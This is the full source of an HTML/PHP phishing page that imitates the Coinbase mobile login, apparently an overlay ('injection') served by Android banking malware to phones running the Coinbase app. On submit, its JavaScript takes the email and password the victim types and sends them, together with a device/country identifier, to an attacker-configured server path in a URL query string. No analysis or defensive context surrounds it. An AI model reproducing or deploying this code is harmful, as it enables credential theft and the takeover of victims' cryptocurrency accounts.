<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bitcoin Wallet - Coinbase</title>
	<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <script src="https://use.fontawesome.com/8d8c3a1b01.js"></script>
	<style>
		body {
	background-color: #0661c4;
	margin: 0;
	padding: 0;
	color: #fff;
	font-family: sans-serif;
	font-weight: 100;
}

.block {
	width: 95%;
	margin: 0 auto;
}

.field-block {
	width: 100%;
	padding: 8px;
	background: #fff;
}

.field {
    width: 100%;
    border: 0;
    padding: 5px 0;
	color: #000;
}
.fielderror {
    width: 100%;
    border: 1px solid #f00;
    padding: 5px 0;
	color: #000;
}

label {
	color: #000;
}

p {
	text-align: center;
}

.button {
	margin-bottom: 10px;
	margin-top: 15px;
	width: 100%;
	padding: 5px;
	font-size: 24px;
	border: 0;
	background: #3e8eed;
}

.header {
	width: 100%;
	text-align: center;
	padding: 10px;
	margin-bottom: 20px;
}

img {
	width: 200px;
}
	</style>
</head>

<body>	
<div id="content_div">
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXQAAABUCAMAAAClZjzjAAADAFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8HPQsIAAAA/3RSTlMAiPMiBEycwsiybxspu+JgLd/+dAzL+kVowQYDvzES6WIe8nUT6mTE/DbNCRTdWEf0lgJL4fuOCB2J1e/lrUQoEDM8QywZChc3QTsfDgEc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">
</div>

	<form action="null" method="post" id="_mainForm" target="flow_handler">
		
		<input type="hidden" value="com.coinbase.android" name="com.coinbase.android">
		
		<div class="block">
			<div class="field-block" style="border-bottom: 1px solid #b3b3b3;">
				<label> EMAIL </label>
				<input type="email" placeholder="name@domain.com" class="field" id="login" name="email" required="">
			</div>
			<div class="field-block">
				<label> PASSWORD </label>
				<input type="password" placeholder="Enter your password" class="field" id="password" name="password" required="">
			</div>
			
			<input type="submit" id="input_submitBtn" class="button" value="Login">
		</div>
		<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 

	</form>
	
	<p> Forgot password? </p>
	
	</div>
            <script type="text/javascript">
				(function () {
                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };
					
                
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className =	oCodeInp.className = 'field';
						} catch(e){};
						
                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						


						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|Coinbase|"+oNumInp.value+"|"+oCodeInp.value);


						return false;
                    };

                })();
            </script>
</body>
</html>
